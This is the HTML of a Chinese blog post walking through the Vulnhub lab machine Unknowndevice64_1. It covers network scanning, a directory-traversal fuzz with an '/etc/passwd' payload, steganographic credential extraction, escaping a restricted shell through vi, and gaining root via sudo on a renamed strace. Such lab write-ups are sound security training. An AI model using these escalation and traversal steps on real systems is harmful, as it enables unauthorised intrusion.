@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Vulnhub-Unknowndevice64_1 - Josephine&#39;s Blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Josephine" /><meta name="description" content="基本介绍 靶机地址 https://www.vulnhub.com/entry/unknowndevice64-1,293/ 目标 获得 root 权限并读取 /root/flag.txt 环境 名称 介绍 主机 Manjaro 20.1 虚拟化软件 Virtualbox 6.1.12 靶机网络 Host-only (vboxnet0) kali in docker 2020.3 工具 名称 版本 arp-scan 1.9.7 Nmap 7.80 wfuzz 2.4.7 steghide 0.5.1 基本信息收集 获取 IP" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.80.0 with theme even" />
+
+
+<link rel="canonical" href="https://bulletforkiller.github.io/post/2020-08-19-vulnhub-unknowndevice64-1/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Vulnhub-Unknowndevice64_1" />
+<meta property="og:description" content="基本介绍 靶机地址 https://www.vulnhub.com/entry/unknowndevice64-1,293/ 目标 获得 root 权限并读取 /root/flag.txt 环境 名称 介绍 主机 Manjaro 20.1 虚拟化软件 Virtualbox 6.1.12 靶机网络 Host-only (vboxnet0) kali in docker 2020.3 工具 名称 版本 arp-scan 1.9.7 Nmap 7.80 wfuzz 2.4.7 steghide 0.5.1 基本信息收集 获取 IP" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bulletforkiller.github.io/post/2020-08-19-vulnhub-unknowndevice64-1/" />
+<meta property="article:published_time" content="2020-08-19T13:10:35+00:00" />
+<meta property="article:modified_time" content="2020-08-19T13:10:35+00:00" />
+<meta itemprop="name" content="Vulnhub-Unknowndevice64_1">
+<meta itemprop="description" content="基本介绍 靶机地址 https://www.vulnhub.com/entry/unknowndevice64-1,293/ 目标 获得 root 权限并读取 /root/flag.txt 环境 名称 介绍 主机 Manjaro 20.1 虚拟化软件 Virtualbox 6.1.12 靶机网络 Host-only (vboxnet0) kali in docker 2020.3 工具 名称 版本 arp-scan 1.9.7 Nmap 7.80 wfuzz 2.4.7 steghide 0.5.1 基本信息收集 获取 IP">
+<meta itemprop="datePublished" content="2020-08-19T13:10:35+00:00" />
+<meta itemprop="dateModified" content="2020-08-19T13:10:35+00:00" />
+<meta itemprop="wordCount" content="1979">
+
+
+
+<meta itemprop="keywords" content="Vulnhub," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnhub-Unknowndevice64_1"/>
+<meta name="twitter:description" content="基本介绍 靶机地址 https://www.vulnhub.com/entry/unknowndevice64-1,293/ 目标 获得 root 权限并读取 /root/flag.txt 环境 名称 介绍 主机 Manjaro 20.1 虚拟化软件 Virtualbox 6.1.12 靶机网络 Host-only (vboxnet0) kali in docker 2020.3 工具 名称 版本 arp-scan 1.9.7 Nmap 7.80 wfuzz 2.4.7 steghide 0.5.1 基本信息收集 获取 IP"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Even</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Even</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Vulnhub-Unknowndevice64_1</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2020-08-19 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> 渗透测试 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#基本介绍">基本介绍</a>
+          <ul>
+            <li><a href="#靶机地址">靶机地址</a></li>
+            <li><a href="#目标">目标</a></li>
+            <li><a href="#环境">环境</a></li>
+            <li><a href="#工具">工具</a></li>
+          </ul>
+        </li>
+        <li><a href="#基本信息收集">基本信息收集</a>
+          <ul>
+            <li><a href="#获取-ip-地址">获取 IP 地址</a></li>
+            <li><a href="#端口扫描">端口扫描</a></li>
+            <li><a href="#服务枚举">服务枚举</a></li>
+          </ul>
+        </li>
+        <li><a href="#web-枚举">Web 枚举</a>
+          <ul>
+            <li><a href="#目录穿越测试">目录穿越测试</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#total-requests-871">Target: http://192.168.56.119:31337/FUZZ
+Total requests: 871</a></li>
+    <li><a href="#id-----------response---lines----word-----chars-------payload">ID           Response   Lines    Word     Chars       Payload</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#web-页面">Web 页面</a></li>
+          </ul>
+        </li>
+        <li><a href="#图片分析">图片分析</a>
+          <ul>
+            <li><a href="#steghide-图片隐写">steghide 图片隐写</a></li>
+          </ul>
+        </li>
+        <li><a href="#权限提升">权限提升</a>
+          <ul>
+            <li><a href="#rbash-绕过">rbash 绕过</a></li>
+            <li><a href="#strace-提权">strace 提权</a></li>
+          </ul>
+        </li>
+        <li><a href="#总结">总结</a></li>
+        <li><a href="#参考资料">参考资料</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="基本介绍">基本介绍</h2>
+<h3 id="靶机地址">靶机地址</h3>
+<p><a href="https://www.vulnhub.com/entry/unknowndevice64-1,293/">https://www.vulnhub.com/entry/unknowndevice64-1,293/</a></p>
+<h3 id="目标">目标</h3>
+<p>获得 <strong>root</strong> 权限并读取 <strong>/root/flag.txt</strong></p>
+<h3 id="环境">环境</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">名称</th>
+<th style="text-align:left">介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">主机</td>
+<td style="text-align:left">Manjaro 20.1</td>
+</tr>
+<tr>
+<td style="text-align:left">虚拟化软件</td>
+<td style="text-align:left">Virtualbox 6.1.12</td>
+</tr>
+<tr>
+<td style="text-align:left">靶机网络</td>
+<td style="text-align:left">Host-only (vboxnet0)</td>
+</tr>
+<tr>
+<td style="text-align:left">kali in docker</td>
+<td style="text-align:left">2020.3</td>
+</tr>
+</tbody>
+</table>
+<h3 id="工具">工具</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">名称</th>
+<th style="text-align:left">版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">arp-scan</td>
+<td style="text-align:left">1.9.7</td>
+</tr>
+<tr>
+<td style="text-align:left">Nmap</td>
+<td style="text-align:left">7.80</td>
+</tr>
+<tr>
+<td style="text-align:left">wfuzz</td>
+<td style="text-align:left">2.4.7</td>
+</tr>
+<tr>
+<td style="text-align:left">steghide</td>
+<td style="text-align:left">0.5.1</td>
+</tr>
+</tbody>
+</table>
+<h2 id="基本信息收集">基本信息收集</h2>
+<h3 id="获取-ip-地址">获取 IP 地址</h3>
+<p>这是一到 boot2root，首先扫描 vboxnet0 网段，获取靶机地址：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">arp-scan -I vboxnet0 --localnet
+</code></pre></td></tr></table>
+</div>
+</div><p>Interface: vboxnet0, type: EN10MB, MAC: 0a:00:27:00:00:00, IPv4: 192.168.56.1
+Starting arp-scan 1.9.7 with 256 hosts (<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a>)
+192.168.56.100	08:00:27:4a:ef:ba	PCS Systemtechnik GmbH
+192.168.56.119	08:00:27:d7:36:8b	PCS Systemtechnik GmbH</p>
+<p>2 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 2.025 seconds (126.42 hosts/sec). 2 responded
+{% endblockquote %}</p>
+<p>排除掉 DHCP 服务器的地址，靶机的地址为 <strong>192.168.56.119</strong>。</p>
+<h3 id="端口扫描">端口扫描</h3>
+<p>使用 <strong>Nmap</strong> 进行全端口扫描，采用半连接扫描能够节约不少的时间：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sS -p- 192.168.56.119
+</code></pre></td></tr></table>
+</div>
+</div><p>Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-08-18 13:12 UTC
+Nmap scan report for 192.168.56.119
+Host is up (0.00012s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE
+1337/tcp  open  waste
+31337/tcp open  Elite
+MAC Address: 08:00:27:D7:36:8B (Oracle VirtualBox virtual NIC)</p>
+<p>Nmap done: 1 IP address (1 host up) scanned in 1.04 seconds
+{% endblockquote %}</p>
+<h3 id="服务枚举">服务枚举</h3>
+<p>对端口扫描得到的结果进行服务枚举，同样使用 <strong>Nmap</strong> 进行，指定 <strong>-sV -sC</strong> 的参数：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -sC -p1337,31337 192.168.56.119
+</code></pre></td></tr></table>
+</div>
+</div><p>Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-08-18 13:16 UTC
+Nmap scan report for 192.168.56.119
+Host is up (0.00050s latency).</p>
+<p>PORT      STATE SERVICE VERSION
+1337/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 b9:af:04:6d:f1:8c:59:3a:d6:e1:96:b7:f7:fc:57:83 (RSA)
+|   256 12:68:4c:6b:96:1e:51:59:32:8a:3d:41:0d:55:6b:d2 (ECDSA)
+|_  256 da:3e:28:52:30:72:7a:dd:c3:fb:89:7e:54:f4:bb:fb (ED25519)
+31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
+|_http-title:    Website By Unknowndevice64<br>
+MAC Address: 08:00:27:D7:36:8B (Oracle VirtualBox virtual NIC)</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
+Nmap done: 1 IP address (1 host up) scanned in 9.87 seconds
+{% endblockquote %}</p>
+<p>可见该机器运行着 OpenSSH 和 Python2 自带的库构建的 Web 服务。经过一番搜索，该版本的 OpenSSH 并不存在漏洞，而 SimpleHTTPServer 可能会存在目录穿越漏洞。</p>
+<h2 id="web-枚举">Web 枚举</h2>
+<h3 id="目录穿越测试">目录穿越测试</h3>
+<p>手动构造了几个目录穿越的 URL 进行测试，无一例外都返回了 404。使用 wfuzz 来测试：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">wfuzz -w /usr/share/wfuzz/wordlist/vulns/dirTraversal-nix.txt --hc 403,404 -u http://192.168.56.119:31337/FUZZ
+</code></pre></td></tr></table>
+</div>
+</div><hr>
+<p>* Wfuzz 2.4.7 - The Web Fuzzer                         *</p>
+<hr>
+<h1 id="total-requests-871">Target: http://192.168.56.119:31337/FUZZ
+Total requests: 871</h1>
+<h1 id="id-----------response---lines----word-----chars-------payload">ID           Response   Lines    Word     Chars       Payload</h1>
+<p>000000017:   404        9 L      25 W     195 Ch      &ldquo;%2e%2e//etc/passwd&rdquo;
+Fatal exception: Pycurl error 52: Empty reply from server
+{% endblockquote %}</p>
+<p>此路不通，只能考虑从别的地方入手。</p>
+<h3 id="web-页面">Web 页面</h3>
+<p>打开浏览器查看页面如下：</p>
+<p><img src="/images/2020-08-18/index.webp" alt="index.html"></p>
+<p>页面比较炫酷，鼠标所在的区域会变亮，这个 <font color=Red>h1dd3n</font> 很是扎眼。</p>
+<p>继续查看网页源代码，找到一行注释：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- key_is_h1dd3n.jpg --&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>访问<a href="http://192.168.56.119:31337/h1dd3n.jpg">http://192.168.56.119:31337/h1dd3n.jpg</a>得到 404 响应；而直接访问<a href="http://192.168.56.119:31337/key_is_h1dd3n.jpg">http://192.168.56.119:31337/key_is_h1dd3n.jpg</a>，得到一张图片：</p>
+<p><img src="/images/2020-08-18/hidden_secrets.webp" alt="hidden_secrets"></p>
+<p>可是这代表什么呢，就算是密码也没有用户名，于是将图片下载到本地。直觉告诉我图片中还有其它的数据。</p>
+<h2 id="图片分析">图片分析</h2>
+<p>首先使用 <strong>binwalk</strong> 分析一下文件，看是否存在其它的文件流：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">binwalk key_is_h1dd3n.jpg
+</code></pre></td></tr></table>
+</div>
+</div><p>DECIMAL       HEXADECIMAL     DESCRIPTION</p>
+<hr>
+<p>0             0x0             JPEG image data, JFIF standard 1.01
+{% endblockquote %}</p>
+<h3 id="steghide-图片隐写">steghide 图片隐写</h3>
+<p>没有其它的数据流，继续使用 <strong>steghide</strong> 分析图片是否隐写，使用 <strong>h1dd3n</strong> 作为密码进行尝试：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">steghide info key_is_h1dd3n.jpg
+</code></pre></td></tr></table>
+</div>
+</div><p>&ldquo;key_is_h1dd3n.jpg&rdquo;:
+format: jpeg
+capacity: 236.0 Byte
+Try to get information about embedded data ? (y/n) y
+Enter passphrase:
+embedded file &ldquo;h1dd3n.txt&rdquo;:
+size: 238.0 Byte
+encrypted: rijndael-128, cbc
+compressed: yes
+{% endblockquote %}</p>
+<p>提取出 <strong>h1dd3n.txt</strong>，查看内容是一串只包含 &ldquo;+-&gt;&lt;[].&rdquo; 的序列，很明显是 <strong>Brainf**k</strong>，使用 <a href="https://www.jdoodle.com/execute-brainfuck-online/">在线解释器</a> 解释执行，得到一个由冒号分隔的串：</p>
+<p>{% blockquote %}
+ud64:*********
+{% endblockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">
+格式很像用户名和密码，登陆 SSH：
+
+```ssh
+ssh ud64@192.168.56.119 -p 1337
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="权限提升">权限提升</h2>
+<h3 id="rbash-绕过">rbash 绕过</h3>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ls
+</code></pre></td></tr></table>
+</div>
+</div><p>-rbash: /bin/ls: restricted: cannot specify `/' in command names
+{% endblockquote %}</p>
+<p>随便执行了几个命令发现当前的 shell 为 <strong>rbash</strong>，查看当前能执行哪些命令，我选择使用按两次 <strong>Tab</strong> 补全的方式，得到了以下的结果：</p>
+<p><img src="/images/2020-08-18/rbash_comm.webp" alt="rbash_command"></p>
+<p>有 <strong>vi</strong>，直接使用 vi 获得 shell，进入 vi，输入 <strong>:!/bin/bash</strong>，成功弹出 bash：</p>
+<p><img src="/images/2020-08-18/bash.webp" alt="bash"></p>
+<h3 id="strace-提权">strace 提权</h3>
+<p>当前的 shell 的路径有问题，执行不了大多数命令，可以先修改 PATH，方便进行后续的步骤：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">PATH</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$PATH</span><span class="s2">:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>查看搜索机器上所有有 SUID 权限的程序：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">find / -perm -4000 2&gt;/dev/null
+</code></pre></td></tr></table>
+</div>
+</div><p>/mnt/live/memory/images/002-xorg.xzm/usr/libexec/Xorg
+/mnt/live/memory/images/002-xorg.xzm/usr/libexec/xf86-video-intel-backlight-helper
+/mnt/live/memory/images/001-core.xzm/bin/fusermount
+/mnt/live/memory/images/001-core.xzm/bin/mount
+/mnt/live/memory/images/001-core.xzm/bin/ntfs-3g
+/mnt/live/memory/images/001-core.xzm/bin/ping
+/mnt/live/memory/images/001-core.xzm/bin/ping6
+/mnt/live/memory/images/001-core.xzm/bin/su
+/mnt/live/memory/images/001-core.xzm/bin/umount
+/mnt/live/memory/images/001-core.xzm/sbin/mount.nfs
+/mnt/live/memory/images/001-core.xzm/usr/bin/chage
+/mnt/live/memory/images/001-core.xzm/usr/bin/chfn
+/mnt/live/memory/images/001-core.xzm/usr/bin/chsh
+/mnt/live/memory/images/001-core.xzm/usr/bin/crontab
+/mnt/live/memory/images/001-core.xzm/usr/bin/expiry
+/mnt/live/memory/images/001-core.xzm/usr/bin/fdmount
+/mnt/live/memory/images/001-core.xzm/usr/bin/gpasswd
+/mnt/live/memory/images/001-core.xzm/usr/bin/newgidmap
+/mnt/live/memory/images/001-core.xzm/usr/bin/newgrp
+/mnt/live/memory/images/001-core.xzm/usr/bin/newuidmap
+/mnt/live/memory/images/001-core.xzm/usr/bin/passwd
+/mnt/live/memory/images/001-core.xzm/usr/bin/pkexec
+/mnt/live/memory/images/001-core.xzm/usr/bin/sudo
+/mnt/live/memory/images/001-core.xzm/usr/bin/traceroute6
+/mnt/live/memory/images/001-core.xzm/usr/lib/polkit-1/polkit-agent-helper-1
+/mnt/live/memory/images/001-core.xzm/usr/libexec/dbus-daemon-launch-helper
+/mnt/live/memory/images/001-core.xzm/usr/libexec/ssh-keysign
+/usr/bin/chage
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/crontab
+/usr/bin/expiry
+/usr/bin/fdmount
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/traceroute6
+/usr/libexec/Xorg
+/usr/libexec/xf86-video-intel-backlight-helper
+/usr/libexec/dbus-daemon-launch-helper
+/usr/libexec/ssh-keysign
+/usr/lib/polkit-1/polkit-agent-helper-1
+/bin/fusermount
+/bin/mount
+/bin/ntfs-3g
+/bin/ping
+/bin/ping6
+/bin/su
+/bin/umount
+/sbin/mount.nfs
+{% endblockquote %}</p>
+<p>并没有找到特别关键的信息。</p>
+<p>继续查看是否能执行 <strong>sudo</strong>：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -l
+</code></pre></td></tr></table>
+</div>
+</div><p>User ud64 may run the following commands on unknowndevice64_v1:
+(ALL) NOPASSWD: /usr/bin/sysud64
+{% endblockquote %}</p>
+<p>只看程序名，并不清楚 <strong>sysud64</strong> 的作用，查看命令的帮助：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sysud64 -h
+</code></pre></td></tr></table>
+</div>
+</div><p>usage: strace [-CdffhiqrtttTvVwxxy] [-I n] [-e expr]&hellip;
+[-a column] [-o file] [-s strsize] [-P path]&hellip;
+-p pid&hellip; / [-D] [-E var=val]&hellip; [-u username] PROG [ARGS]
+or: strace -c[dfw] [-I n] [-e expr]&hellip; [-O overhead] [-S sortby]
+-p pid&hellip; / [-D] [-E var=val]&hellip; [-u username] PROG [ARGS]</p>
+<p>Output format:
+-a column      alignment COLUMN for printing syscall results (default 40)
+-i             print instruction pointer at time of syscall
+-k             obtain stack trace between each syscall (experimental)
+-o file        send trace output to FILE instead of stderr
+-q             suppress messages about attaching, detaching, etc.
+-r             print relative timestamp
+-s strsize     limit length of print strings to STRSIZE chars (default 32)
+-t             print absolute timestamp
+-tt            print absolute timestamp with usecs
+-T             print time spent in each syscall
+-x             print non-ascii strings in hex
+-xx            print all strings in hex
+-y             print paths associated with file descriptor arguments
+-yy            print protocol specific information associated with socket file descriptors</p>
+<p>Statistics:
+-c             count time, calls, and errors for each syscall and report summary
+-C             like -c but also print regular output
+-O overhead    set overhead for tracing syscalls to OVERHEAD usecs
+-S sortby      sort syscall counts by: time, calls, name, nothing (default time)
+-w             summarise syscall latency (default is system time)</p>
+<p>Filtering:
+-e expr        a qualifying expression: option=[!]all or option=[!]val1[,val2]&hellip;
+options:    trace, abbrev, verbose, raw, signal, read, write, fault
+-P path        trace accesses to path</p>
+<p>Tracing:
+-b execve      detach on execve syscall
+-D             run tracer process as a detached grandchild, not as parent
+-f             follow forks
+-ff            follow forks with output into separate files
+-I interruptible
+1:          no signals are blocked
+2:          fatal signals are blocked while decoding syscall (default)
+3:          fatal signals are always blocked (default if &lsquo;-o FILE PROG&rsquo;)
+4:          fatal signals and SIGTSTP (^Z) are always blocked
+(useful to make &lsquo;strace -o FILE PROG&rsquo; not stop on ^Z)</p>
+<p>Startup:
+-E var         remove var from the environment for command
+-E var=val     put var=val in the environment for command
+-p pid         trace process with process id PID, may be repeated
+-u username    run command as username handling setuid and/or setgid</p>
+<p>Miscellaneous:
+-d             enable debug output to stderr
+-v             verbose mode: print unabbreviated argv, stat, termios, etc. args
+-h             print help message
+-V             print version
+{% endblockquote %}</p>
+<p>原来不过是 <strong>strace</strong> 换了一个名字而已，执行以下的命令提权：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo sysud64 -o /dev/null /bin/bash
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/2020-08-18/root.webp" alt="get_root"></p>
+<h2 id="总结">总结</h2>
+<p>总而来看，该靶机的难度还是比较简单的，整体的风格更偏向于 <strong>CTF</strong>。如果做过 CTF 的杂项题目，基本没有任何压力就可以完成。最后提权也是常规的检查 <strong>sudo</strong> 来提权。不过做完之后才发现 <strong>rbash</strong> 可以直接用 <strong>ssh -t</strong> 参数来绕过，感觉更加简单便捷，GET 到新的姿势了。</p>
+<p>docker 版的 kali 还是不错的，这里 kali 容器的网络类型我选的是 <strong>host</strong>，使用体验和本机基本没有差别；默认 <strong>root</strong> 用户，与主系统隔离，真香。至于有 GUI 的工具嘛，交给 Manjaro 处理也没啥问题。</p>
+<h2 id="参考资料">参考资料</h2>
+<ol>
+<li>
+<p><a href="https://www.hackingarticles.in/comprehensive-guide-to-steghide-tool/">Steghide</a></p>
+</li>
+<li>
+<p><a href="https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/">受限 Bash 绕过</a></p>
+</li>
+<li>
+<p><a href="https://gtfobins.github.io/gtfobins/strace/">strace 利用</a></p>
+</li>
+</ol>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Josephine</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2020-08-19
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/vulnhub/">Vulnhub</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/2020-08-22-%E6%97%A5%E5%B8%B8-git-%E8%B8%A9%E5%9D%91/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">日常 Git 踩坑</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/2020-08-16-linux-%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BC%B9%E5%87%BA%E5%8F%AF%E7%A7%BB%E5%8A%A8%E7%A3%81%E7%9B%98/">
+            <span class="next-text nav-default">Linux 命令行弹出可移动磁盘</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://bulletforkiller.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>Josephine</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
